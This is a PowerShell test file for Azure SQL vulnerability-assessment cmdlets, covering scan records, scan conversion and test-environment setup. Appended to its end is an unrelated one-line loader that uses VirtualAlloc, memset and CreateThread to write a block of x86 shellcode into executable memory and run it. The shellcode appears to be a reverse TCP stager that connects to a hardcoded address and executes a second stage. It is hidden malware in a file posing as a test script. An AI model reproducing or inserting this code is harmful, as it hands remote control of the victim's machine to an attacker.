		-DatabaseName $params.databaseName -ScanId $scanId1

		Assert-AreEqual $scanRecord1FromGet.ResourceGroupName $scanRecord1.ResourceGroupName
		Assert-AreEqual $scanRecord1FromGet.ServerName $scanRecord1.ServerName
		Assert-AreEqual $scanRecord1FromGet.DatabaseName $scanRecord1.DatabaseName
		Assert-AreEqual $scanRecord1FromGet.ScanId $scanRecord1.ScanId
		Assert-AreEqual $scanRecord1FromGet.TriggerType $scanRecord1.TriggerType
		Assert-AreEqual $scanRecord1FromGet.State $scanRecord1.State
		Assert-AreEqual $scanRecord1FromGet.StartTime $scanRecord1.StartTime
		Assert-AreEqual $scanRecord1FromGet.EndTime $scanRecord1.EndTime
		Assert-AreEqual $scanRecord1FromGet.Errors $scanRecord1.Errors
		Assert-AreEqual $scanRecord1FromGet.ScanResultsLocationPath $scanRecord1.ScanResultsLocationPath
		Assert-AreEqual $scanRecord1FromGet.NumberOfFailedSecurityChecks $scanRecord1.NumberOfFailedSecurityChecks

		
		$scanRecord1FromGet = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord `
		-ScanId $scanId1

		Assert-AreEqual $scanRecord1FromGet.ResourceGroupName $scanRecord1.ResourceGroupName
		Assert-AreEqual $scanRecord1FromGet.ServerName $scanRecord1.ServerName
		Assert-AreEqual $scanRecord1FromGet.DatabaseName $scanRecord1.DatabaseName
		Assert-AreEqual $scanRecord1FromGet.ScanId $scanRecord1.ScanId
		Assert-AreEqual $scanRecord1FromGet.TriggerType $scanRecord1.TriggerType
		Assert-AreEqual $scanRecord1FromGet.State $scanRecord1.State
		Assert-AreEqual $scanRecord1FromGet.StartTime $scanRecord1.StartTime
		Assert-AreEqual $scanRecord1FromGet.EndTime $scanRecord1.EndTime
		Assert-AreEqual $scanRecord1FromGet.Errors $scanRecord1.Errors
		Assert-AreEqual $scanRecord1FromGet.ScanResultsLocationPath $scanRecord1.ScanResultsLocationPath
		Assert-AreEqual $scanRecord1FromGet.NumberOfFailedSecurityChecks $scanRecord1.NumberOfFailedSecurityChecks

		
		$excpectedScanCount = 2
		$scanRecordList = Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 
		Assert-AreEqual $excpectedScanCount $scanRecordList.Count

		$scanRecord1FromListCmdlet = $scanRecordList[$excpectedScanCount-1]
		Assert-AreEqual $scanRecord1FromListCmdlet.ResourceGroupName $scanRecord1.ResourceGroupName
		Assert-AreEqual $scanRecord1FromListCmdlet.ServerName $scanRecord1.ServerName
		Assert-AreEqual $scanRecord1FromListCmdlet.DatabaseName $scanRecord1.DatabaseName
		Assert-AreEqual $scanRecord1FromListCmdlet.ScanId $scanRecord1.ScanId
		Assert-AreEqual $scanRecord1FromListCmdlet.TriggerType $scanRecord1.TriggerType
		Assert-AreEqual $scanRecord1FromListCmdlet.State $scanRecord1.State
		Assert-AreEqual $scanRecord1FromListCmdlet.StartTime $scanRecord1.StartTime
		Assert-AreEqual $scanRecord1FromListCmdlet.EndTime $scanRecord1.EndTime
		Assert-AreEqual $scanRecord1FromListCmdlet.Errors $scanRecord1.Errors
		Assert-AreEqual $scanRecord1FromListCmdlet.ScanResultsLocationPath $scanRecord1.ScanResultsLocationPath
		Assert-AreEqual $scanRecord1FromListCmdlet.NumberOfFailedSecurityChecks $scanRecord1.NumberOfFailedSecurityChecks

		
		$excpectedScanCount = $excpectedScanCount + 1
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		| Start-AzSqlDatabaseVulnerabilityAssessmentScan -ScanId $scanId1

		
		$scanRecordList = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord 
		Assert-AreEqual $excpectedScanCount $scanRecordList.Count

		$scanRecord1FromListCmdlet = $scanRecordList[$excpectedScanCount-1]
		Assert-AreEqual $scanRecord1FromListCmdlet.ResourceGroupName $scanRecord1.ResourceGroupName
		Assert-AreEqual $scanRecord1FromListCmdlet.ServerName $scanRecord1.ServerName
		Assert-AreEqual $scanRecord1FromListCmdlet.DatabaseName $scanRecord1.DatabaseName
		Assert-AreEqual $scanRecord1FromListCmdlet.ScanId $scanRecord1.ScanId
		Assert-AreEqual $scanRecord1FromListCmdlet.TriggerType $scanRecord1.TriggerType
		Assert-AreEqual $scanRecord1FromListCmdlet.State $scanRecord1.State


		
		$scanRecordList = Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$scansCount = $scanRecordList.Count

		Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-WhatIf

		
		$scanRecordList = Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual $scansCount $scanRecordList.Count
	}
	finally
	{
		
		Remove-VulnerabilityAssessmentTestEnvironment $testSuffix
	}
}


function Test-VulnerabilityAssessmentScanConvertTest
{
	
	$testSuffix = getAssetName
	Create-VulnerabilityAssessmentTestEnvironment $testSuffix
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix

	try
	{
		
		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $params.serverName -DoNotConfigureVulnerabilityAssessment

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
			 -StorageAccountName $params.storageAccount

		
		Assert-ThrowsContains -script { Convert-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName } -message "ScanId is a required parameter for this cmdlet. Please explicitly provide it or pass the Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord output via pipe."

		
		$scanId = "cmdletConvertScan"
		Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId

		
		$convertScanObject = Convert-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-ScanId $scanId
	
		Assert-AreEqual $params.rgname $convertScanObject.ResourceGroupName
		Assert-AreEqual $params.serverName $convertScanObject.ServerName
		Assert-AreEqual $params.databaseName $convertScanObject.DatabaseName
		Assert-True -script  { $convertScanObject.ExportedReportLocation.Contains($scanId) }
		Assert-True -script  { $convertScanObject.ExportedReportLocation.Contains($params.storageAccount) }

		
		$scanId = "cmdletConvertScan1"
		Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId

		$convertScanObject =  Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-ScanId $scanId | Convert-AzSqlDatabaseVulnerabilityAssessmentScan
	
		Assert-AreEqual $params.rgname $convertScanObject.ResourceGroupName
		Assert-AreEqual $params.serverName $convertScanObject.ServerName
		Assert-AreEqual $params.databaseName $convertScanObject.DatabaseName
		Assert-True -script  { $convertScanObject.ExportedReportLocation.Contains($scanId) }
		Assert-True -script  { $convertScanObject.ExportedReportLocation.Contains($params.storageAccount) }

		
		$convertScanObject = Convert-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-ScanId $scanId -WhatIf
		Assert-Null $convertScanObject.ExportedReportLocation

		
		Clear-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountName $params.storageAccount

		
		Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId
	}
	finally
	{
		
		Remove-VulnerabilityAssessmentTestEnvironment $testSuffix
	}
}


function Create-VulnerabilityAssessmentTestEnvironment ($testSuffix, $location = "West Central US", $serverVersion = "12.0")
{
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix
	Create-TestEnvironmentWithParams $params $location $serverVersion
}


function Get-SqlVulnerabilityAssessmentTestEnvironmentParameters ($testSuffix)
{
	return @{ rgname = "sql-va-cmdlet-test-rg" +$testSuffix;
			  serverName = "sql-va-cmdlet-server" +$testSuffix;
			  databaseName = "sql-va-cmdlet-db" + $testSuffix;
			  storageAccount = "sqlvacmdlets" +$testSuffix
		}
}


function Remove-VulnerabilityAssessmentTestEnvironment ($testSuffix)
{
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix
	Remove-AzResourceGroup -Name $params.rgname -Force
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5b,0x69,0x3c,0xac,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

